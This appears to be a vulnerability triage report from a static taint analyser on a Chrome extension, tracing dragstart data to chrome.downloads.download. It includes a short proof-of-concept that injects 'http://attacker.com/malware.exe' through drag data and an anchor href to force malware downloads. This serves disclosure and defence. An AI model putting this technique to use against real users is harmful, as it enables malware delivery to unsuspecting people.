# CoCo Analysis: dmmpggjbbkfmldkfonjnpbdcmienbjil

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (50+ similar flows from document_eventListener_dragstart → chrome_downloads_download_sink)

---

## Sink: document_eventListener_dragstart → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dmmpggjbbkfmldkfonjnpbdcmienbjil/opgen_generated_files/cs_0.js
Line 591: `function handleDragStart(e) {`
Line 605: `g_SelectStr = e.path[i].href;`
Line 627: `g_SelectStr = g_SelectStr.replace(/^:*[\/\\\s]*/, "http://").replace(/^ht(tp:\/\/ftp\.)/i, "f$1");`

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
function handleDragStart(e) {  // Line 591
    // ... initialization ...

    if ("[object HTMLImageElement]" === e.srcElement.toString()) {
        g_IsImage = true;
        g_SelectStr = e.srcElement.currentSrc.toString(); // ← attacker-controlled via DOM
        for (var i = 0; i < e.path.length; i++) {
            if ('A' === e.path[i].nodeName && false === g_settingIsPreferSaveImage) {
                g_IsImage = false;
                g_IsAddressSearch = true;
                g_SelectStr = e.path[i].href; // ← attacker-controlled href
                break;
            }
        }
    } else {
        if (true === isRFC3986(e.dataTransfer.getData("text/plain").replace(/^ +/i, ""))) {
            g_IsAddressSearch = true;
            g_SelectStr = e.dataTransfer.getData("text/plain").replace(/^ +/i, ""); // ← attacker-controlled
            // Minimal sanitization
            g_SelectStr = g_SelectStr.replace(/^:*[\/\\\s]*/, "http://").replace(/^ht(tp:\/\/ftp\.)/i, "f$1");
        }
    }

    sendMessage(g_SelectStr, g_IsImage, g_IsBase64, g_IsAddressSearch); // Send to background
}

// Background script - Message handler (bg.js)
chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        switch (request.type) {
        case 'searchURL':
            searchURL(request, sender, sendResponse);
            break;
        case 'downloadImage':
            downloadImage(request, sender, sendResponse); // ← Handler for downloads
            break;
        }
    }
);

// Background - Download sink (bg.js Line 1046-1053)
function downloadImage(request, sender, callback) {
    var downloading = chrome.downloads.download({
        url: request.value, // ← attacker-controlled URL from dragstart event
        saveAs: true,
        conflictAction: "overwrite"
    });
    callback("downloadImage:" + downloading);
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (dragstart)

**Attack:**

```javascript
// Malicious webpage creates a fake image element with attacker-controlled URL
var maliciousImg = document.createElement('img');
maliciousImg.src = 'data:image/png;base64,iVBORw0KG...'; // visible fake image
maliciousImg.setAttribute('data-real-src', 'http://attacker.com/malware.exe');

// When user drags the image, intercept and inject malicious URL
document.addEventListener('dragstart', function(e) {
    if (e.target === maliciousImg) {
        // Inject attacker-controlled download URL
        e.dataTransfer.setData('text/plain', 'http://attacker.com/malware.exe');
    }
});

// Or exploit via crafted href in anchor tag
var maliciousLink = document.createElement('a');
maliciousLink.href = 'http://attacker.com/malware.exe';
maliciousLink.innerHTML = '<img src="legit-looking-image.png">';
document.body.appendChild(maliciousLink);

// When user drags this image, the extension extracts e.path[i].href
// which contains the attacker-controlled malicious URL and triggers download
```

**Impact:** Arbitrary file download vulnerability. An attacker can trick users into downloading malicious files (malware, executables, scripts) by controlling the dragstart event data on a malicious webpage. When a user drags content from the attacker's page, the extension will download any file from an attacker-controlled URL. This is a classic arbitrary download vulnerability that can be used to distribute malware.
